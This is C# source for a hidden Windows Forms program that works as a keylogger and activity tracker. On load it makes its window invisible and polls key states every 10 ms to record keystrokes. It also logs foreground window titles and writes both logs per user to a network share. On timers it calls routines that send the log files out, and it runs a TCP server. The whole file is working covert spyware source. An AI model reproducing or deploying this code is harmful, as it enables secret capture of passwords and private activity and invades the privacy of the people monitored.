using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using System.Threading;
namespace DllIm
{

    public partial class Form1 : Form
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        private System.Windows.Forms.Timer T2;
        private System.Windows.Forms.Timer t1;
        private System.Windows.Forms.Timer T3;
        private System.Windows.Forms.Timer T4;
        ClientTools ct;
        private string keyBuffer = string.Empty;
        private StreamWriter af;
        private String Activity = "";
        public Form1()
        {
            
            InitializeComponent();
        }

        private void t1_Tick(object sender, EventArgs e)
        {
            Process[] processlist = Process.GetProcesses();
            foreach (Process p in processlist)
            {
                if (p.MainWindowHandle != IntPtr.Zero)
                {
                    if (GetForegroundWindow() == p.MainWindowHandle)
                    {
                        string edittext = p.MainWindowTitle;
                        if (edittext != Activity)
                        {
                            af = new StreamWriter(@"\\PAPA-ROMEO\Testing\Client\"+Environment.UserName.ToString()+"App.lab", true);
                            af.Write(string.Format("\n"+DateTime.Now + "    " + edittext + "\n"));
                            af.Close();
                            Activity = edittext;
                        }
                    }
                }
            }

        }
        public void initTimer1()
        {
             t1 = new System.Windows.Forms.Timer();
             t1.Tick += new EventHandler(t1_Tick);
             t1.Interval = 1000;
             t1.Start();
        }
        protected void initTimer2()
        {
            T3 = new System.Windows.Forms.Timer();
            T2 = new System.Windows.Forms.Timer();
            T3.Tick += new EventHandler(t3_Tick);
            T2.Tick += new EventHandler(t2_tick);
            T3.Interval = 10;
            T2.Interval = 30000;
            T2.Start();
            T3.Start();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            //System.Threading.Thread ImageListenerThread = new Thread(new ThreadStart(ClientTools.Listener));
            //ImageListenerThread.Start();
            this.Visible = false;
            this.Opacity = 0;
            Thread th = new Thread(ClientTools.broadcastreply);
            th.Start();
            initTimer1();
            initTimer2();
            initTimer3();
            //ClientTools.Capture_Screen();
            ClientTools.tcpServer();
        }
        private void t3_Tick(  object sender, EventArgs e )
        {
                 foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
                    {
                        int x = GetAsyncKeyState(i);
                        if (x==1 || (x == Int16.MinValue + 1))
                        {
                            keyBuffer += Enum.GetName(typeof(Keys), i) ;
                        }
                    }
            if (keyBuffer != "")
            {
                keyBuffer = keyBuffer.Replace("Space", " ");
                keyBuffer = keyBuffer.Replace("Delete", "Key_DEL");
                keyBuffer = keyBuffer.Replace("LShiftKey", "SHIFT");
                keyBuffer = keyBuffer.Replace("ShiftKey", "SHIFT");
                keyBuffer = keyBuffer.Replace("OemQuotes", "!");
                keyBuffer = keyBuffer.Replace("Oemcomma", "?");
                keyBuffer = keyBuffer.Replace("D8", "8");
                keyBuffer = keyBuffer.Replace("D1", "1");
                keyBuffer = keyBuffer.Replace("D2", "2");
                keyBuffer = keyBuffer.Replace("D3", "3");
                keyBuffer = keyBuffer.Replace("D4", "4");
                keyBuffer = keyBuffer.Replace("D5", "5");
                keyBuffer = keyBuffer.Replace("D6", "6");
                keyBuffer = keyBuffer.Replace("D7", "7");
                keyBuffer = keyBuffer.Replace("D9", "9");
                keyBuffer = keyBuffer.Replace("D0", "0");
                keyBuffer = keyBuffer.Replace("Back", "<==");
                keyBuffer = keyBuffer.Replace("LButton", "");
                keyBuffer = keyBuffer.Replace("RButton", "");
                keyBuffer = keyBuffer.Replace("NumPad", "");
                keyBuffer = keyBuffer.Replace("OemPeriod", ".");
                keyBuffer = keyBuffer.Replace("OemSemicolon", "ů");
                keyBuffer = keyBuffer.Replace("Oem4", "/");
                keyBuffer = keyBuffer.Replace("LControlKey", "CTRL");
                keyBuffer = keyBuffer.Replace("ControlKey", "CTRL");
                keyBuffer = keyBuffer.Replace("Enter", "");
                keyBuffer = keyBuffer.Replace("Shift", "SHIFT");
            }

        }
        public void t2_tick(object sender, EventArgs e)
        {
            af = new StreamWriter(@"\\PAPA-ROMEO\Testing\Client\"+Environment.UserName.ToString()+"KeyStroke.lab", true);
            af.Write(keyBuffer);
            af.Close();
            keyBuffer = string.Empty;
        }
        public void t4_tick(object sender, EventArgs e)
        {
            ClientTools.sendFileApp();
            ClientTools.sendFileKeyStroke();
        }
        public void initTimer3()
        {
            T4 = new System.Windows.Forms.Timer();
            T4.Tick += new EventHandler(t4_tick);
            T4.Interval = 60000;
            T4.Start();
        }
    }
}
